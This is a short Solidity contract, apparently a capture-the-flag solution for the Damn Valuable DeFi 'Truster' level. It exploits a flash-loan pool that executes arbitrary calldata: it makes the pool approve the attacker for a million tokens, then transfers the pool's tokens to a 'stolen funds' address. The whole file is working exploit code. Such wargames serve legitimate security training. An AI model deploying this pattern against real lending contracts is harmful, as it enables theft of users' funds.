// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract TrusterAttack {
    TrusterLenderPool pool;
    DamnValuableToken token;
    uint256 constant ATTACK_AMOUNT = 10 ** 18 * 1000000;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token) {
        pool = _pool;
        token = _token;
    }

    function attack(address _stolenFundsAddress) external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            ATTACK_AMOUNT
        );
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(
            address(pool),
            _stolenFundsAddress,
            ATTACK_AMOUNT
        );
    }
}
